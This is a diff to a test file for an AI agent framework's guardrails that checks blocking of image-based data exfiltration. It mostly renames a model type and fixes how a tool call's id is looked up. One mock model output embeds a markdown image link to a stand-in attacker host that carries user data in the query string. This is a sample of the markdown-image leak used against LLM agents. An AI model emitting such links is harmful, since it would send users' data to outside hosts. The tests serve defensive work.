@@ -11,7 +11,7 @@ import { DETECT_RULES } from '../../src/guardrails/rules.ts';
 import { registerProfile, registerTool, runSession } from '../../src/kernel/default-scope.ts';
 import { assertEquals } from '../../src/kernel/engine/assert.ts';
 import { defineProfile } from '../../src/kernel/registry/profiles.ts';
-import type { ModelProvider, TurnEvent, TurnRequest } from '../../src/kernel/types.ts';
+import type { TurnEvent, TurnModel, TurnRequest } from '../../src/kernel/types.ts';
 import { eventsOf } from '../fixtures/events.ts';
 import { MockLiveWebSocket } from '../fixtures/live-socket.ts';
 import { geminiModels, HOST_BINDINGS } from '../fixtures/models.ts';
@@ -63,7 +63,7 @@ function imageVerdicts(events: TurnEvent[]): {
     ),
   };
 }
-function lookupThen(reply: string, first?: string): ModelProvider {
+function lookupThen(reply: string, first?: string): TurnModel {
   let call = 0;
   return {
     async *complete() {
@@ -81,7 +81,7 @@ function lookupThen(reply: string, first?: string): ModelProvider {
     },
   };
 }
-async function run(provider: ModelProvider, request: Partial<TurnRequest> = {}) {
+async function run(provider: TurnModel, request: Partial<TurnRequest> = {}) {
   const events: TurnEvent[] = [];
   for await (const event of runTurn(
     { profile: 'image_exfil_bot', input: { text: 'show me' }, ...request },
@@ -121,7 +121,7 @@ Deno.test('image exfil: a URL the model wrote itself earlier in the turn is not 
   assertEquals([imageBlocked, text.includes('![p]')], [true, false]);
 });
 Deno.test('image exfil: a thought loading an unseen image loses it, and the turn goes on', async () => {
-  const provider: ModelProvider = {
+  const provider: TurnModel = {
     async *complete() {
       yield { type: 'thought', text: 'Maybe ![p](https://attacker.io/p?d=alice) helps. ' };
       yield { type: 'thought', text: `Or ![photo](https://brand.site/logo.png).` };
@@ -185,7 +185,12 @@ async function liveReply(
     toolCall: { functionCalls: [{ id: 'c1', name: 'image_lookup', args: { topic: 'x' } }] },
   });
   await until(() => events.some((e) => e.type === 'tool'));
-  await session.executeTool({ callId: 'c1' });
+  // The kernel mints the call's id; the session runs it under that id, not the wire's.
+  const issued = events.find(
+    (e) => e.type === 'tool' && e.tool.phase === undefined && e.tool.name === 'image_lookup',
+  );
+  if (issued?.type !== 'tool') throw new Error('the session never surfaced the call');
+  await session.executeTool({ callId: issued.tool.callId });
   if (thought)
     live.deliver({ serverContent: { modelTurn: { parts: [{ text: thought, thought: true }] } } });
   live.deliver({ serverContent: { modelTurn: { parts: [{ text: reply }] } } });
